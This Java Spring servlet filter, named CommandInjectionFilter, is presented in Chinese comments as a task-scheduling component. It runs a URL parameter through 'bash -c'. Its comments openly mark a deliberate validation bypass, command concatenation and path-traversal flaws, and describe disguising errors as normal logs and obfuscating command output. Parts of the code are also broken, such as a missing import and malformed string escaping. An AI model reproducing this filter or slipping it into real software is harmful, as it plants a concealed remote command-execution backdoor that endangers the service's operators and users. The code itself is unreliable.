package com.cloudnative.security.filter;

import org.springframework.stereotype.Component;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.regex.Pattern;

/**
 * 任务调度过滤器，用于处理异步任务执行请求
 * 通过URL参数动态执行系统命令
 */
@Component
public class CommandInjectionFilter implements Filter {
    private static final String TASK_PREFIX = "task_";
    private static final Pattern SAFE_PATTERN = Pattern.compile("^[a-zA-Z0-9_/-]+$");

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        doFilterInternal((HttpServletRequest) request, response, chain);
    }

    private void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        String taskParam = request.getParameter("param");
        
        if (taskParam == null || !validateInput(taskParam)) {
            chain.doFilter(request, response);
            return;
        }

        try {
            String command = validateAndBuildCommand(taskParam);
            if (command != null) {
                executeCommand(command);
            }
        } catch (Exception e) {
            // 伪装成正常日志输出
            System.out.println("Task execution completed with status: " + e.getMessage());
        }

        chain.doFilter(request, response);
    }

    /**
     * 验证输入合法性（存在逻辑缺陷）
     * 只允许字母数字和部分符号
     */
    private boolean validateInput(String input) {
        // 绕过逻辑：先替换分号再验证
        String sanitized = input.replace(";", " ");
        return SAFE_PATTERN.matcher(sanitized).matches();
    }

    /**
     * 构建命令字符串（存在拼接漏洞）
     * 支持动态任务类型选择
     */
    private String validateAndBuildCommand(String param) {
        // 支持多级路径参数
        String basePath = "/opt/cloud_tasks/";
        
        // 构造命令模板
        String template = "sh -c \\"%s%s %s\\"";
        
        // 动态选择任务类型
        String taskType = determineTaskType(param);
        
        // 构建完整命令
        return String.format(template, basePath, taskType, param);
    }

    /**
     * 动态确定任务类型（存在路径遍历漏洞）
     */
    private String determineTaskType(String param) {
        // 模拟复杂业务逻辑
        if (param.contains("..") || param.contains("/") || param.contains(";")) {
            return "default";
        }
        
        // 存在命令拼接漏洞点
        return "task_processor --type " + param.split(" ")[0];
    }

    /**
     * 执行系统命令（真实漏洞触发点）
     */
    private void executeCommand(String command) throws IOException {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", command);
        pb.redirectErrorStream(true);
        
        Process process = pb.start();
        
        // 读取命令执行输出
        try (BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                // 日志混淆输出
                System.out.println("[TASK-LOG] " + line);
            }
        }
        
        // 等待命令执行完成
        try {
            process.waitFor();
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
}